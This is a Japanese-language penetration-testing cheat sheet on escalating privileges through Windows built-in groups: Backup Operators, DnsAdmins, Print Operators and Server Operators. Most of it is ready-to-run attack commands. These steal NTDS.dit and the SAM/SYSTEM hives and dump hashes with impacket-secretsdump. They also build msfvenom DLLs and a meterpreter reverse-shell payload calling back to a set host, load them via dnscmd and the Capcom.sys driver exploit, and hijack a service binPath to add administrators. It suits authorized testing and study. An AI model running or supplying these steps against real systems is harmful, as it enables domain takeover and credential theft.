# Windows Group Privileges

# Backup Operators

このグループのメンバーになると、そのメンバーに `SeBackup` および `SeRestore` 権限が付与される。 `SeBackupPrivilege` を使用すると、任意のフォルダーを横断してフォルダーの内容を一覧表示できる。これにより、フォルダーのアクセス制御リスト (ACL) にアクセス制御エントリー (ACE) がない場合でも、フォルダーからファイルをコピーできるようになる。ただし、標準の copy コマンドを使用してこれを行うことはできない。代わりに、`FILE_FLAG_BACKUP_SEMANTICS` フラグを必ず指定して、プログラムでデータをコピーする必要がある。

## ローカル攻撃

### Importing Libraries

これらの特権をローカルで活用するために、次の手順が使用される

```powershell-session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### SeBackupPrivilege が有効であることの確認

```
Set-SeBackupPrivilege     # 権限を有効する
Get-SeBackupPrivilege     # 権限が有効かチェック
```

### 制限されたディレクトリからファイルにアクセスしてコピーする場合

```
ls C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

## AD攻撃

ドメインコントローラのファイルシステムへの直接アクセスにより、すべてのドメインユーザーおよびコンピューターのNTLMハッシュを含む`NTDS.dit`データベースを盗むことができる。

### 必要なライブラリのインポート

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### diskshadow.exeの使用

`NTDS.dit` ファイルはデフォルトでロックされているため、Windows の [discshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) ユーティリティを使用して C ドライブのシャドウ コピーを作成し、それを E ドライブとして公開できる。このシャドウ コピー内の `NTDS.dit` はシステムによって使用されない。

```powershell-session
PS C:\hatto> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\hatto> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

### NTDS.dit をローカルにコピーする

#### Copy-FileSeBackupPrivilege を使用したファイルのコピー

```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit ntds.dit
```

#### Robocopy を使用したファイルのコピー

組み込みユーティリティ [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) を使用して、バックアップ モードでもファイルをコピーできる

```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

### SAM および SYSTEM レジストリ ハイブのバックアップ

SAM および SYSTEM レジストリ ハイブをバックアップすることで `Impacket` の `Secretsdump.py` などのツールを使用して、ローカル アカウントの資格情報をオフラインで抽出できる

```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Impacket-SecretsDump を使用したハッシュの抽出

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```
その他解析手法

[Windows 権限昇格 SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

[資格情報のダンプ: NTDS.dit](https://www.hackingarticles.in/credential-dumping-ntds-dit/)

# DnsAdmins

`DnsAdmins` グループのメンバーは、DNSサーバー（通常はドメインコントローラーにホストされる）で任意のDLLをSYSTEM権限で読み込む特権を悪用できる。この機能により、重要な悪用の可能性が生じる

## DnsAdminsグループのメンバーをリストアップ

```
Get-ADGroupMember -Identity DnsAdmins
```

## 任意のDLLの実行

次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）を読み込ませる

```
dnscmd.exe /config /serverlevelplugindll C:\path\to\<カスタムDLL>  # フルパスで指定
dnscmd.exe /config /serverlevelplugindll \\<smbserver-ip>\share\<カスタムDLL>
```

### カスタムDLLの作成

ドメイン管理者グループにユーザーを追加
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

リバースシェル

```
msfvenom -p windows/x64/exec cmd='<任意のコマンド>' -f dll -o evil.dll
```

## DNSの再起動

DNSを再起動することでロードしたDLLに埋め込まれたコマンドが実行される

```
sc stop dns
sc start dns
```

## Mimilib.dll

mimilib.dllを使用してコマンドを実行したり、特定のコマンドやリバースシェルを実行するように変更することもできる

[Abusing DNSAdmins privilege for escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

# Print Operators

Print Operators はメンバーに `SeLoadDriverPrivilege` (ドメイン コントローラーに接続されているプリンターを管理、作成、共有、削除する権限) と、ドメイン コントローラーにローカルでログオンしてシャットダウンする権限を付与する

## ドライバーへの参照を追加

`Capcom.sys` ドライバーをダウンロードし、以下のコマンドを発行して、HKEY_CURRENT_USER ツリーの下にこのドライバーへの参照を追加

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

### Capcom.sysがロードされているか確認する

`DriverView.exe` を使用すると、`Capcom.sys` ドライバーがロードされていないことを確認できる

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

### 特権が有効になっていることを確認する

```
EnableSeLoadDriverPrivilege.exe
```

## ExploitCapcom を使用して権限を昇格

msfvenomでリバースシェルバイナリを作成

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=4444 -f exe -o evil.exe
```

ExploitCapcom.cppの`LaunchShell`関数の `C:\\Windows\\system32\\cmd.exe` の部分をmsfvenomで作成したリバースシェルバイナリのパスに置き換える

```c++
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Visual Studio 2022でコンパイルしてターゲットマシンにダウンロード

生成した msfvenom ペイロードに基づいてリスナーを起動し、ターゲットマシンで `ExploitCapcom.exe` を実行することでリバース シェル接続を受信できる

## EopLoadDriver による自動化

[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/tree/master) などのツールを使用すると、特権の有効化、レジストリ キーの作成、NTLoadDriver の実行によるドライバのロードのプロセスを自動化できる

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom Capcom.sys
```

# Server Operator

`Server Operator` のメンバーはドメイン管理者権限を割り当てることなく Windows サーバーを管理できる。これは、ドメイン コントローラーを含むサーバーにローカルでログインできる、非常に高い特権を持つグループ

`SeBackupPrivilege` および `SeRestorePrivilege` 権限と、ローカル サービスを制御する機能が付与される。

## Server Operatorのメンバーを列挙

```
Get-ADGroupMember -Identity "Server Operators"
```

## サービスバイナリパスの変更

バイナリ パスを変更して、現在のユーザーをデフォルトのローカル管理者グループに追加する

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

## サービスの開始

このときサービスの開始は失敗するが大丈夫

```
sc start AppReadiness
```

## ローカル管理者グループのメンバーシップの確認

```
net localgroup Administrators
```

## ドメイン コントローラーでのローカル管理者アクセスの確認

```
netexec smb <targetip> -u <username> -p '<password>'
```

## ドメイン コントローラーから NTLM パスワード ハッシュを取得

```
impacket-secretsdump <username>@<targetip> -just-dc-user administrator
```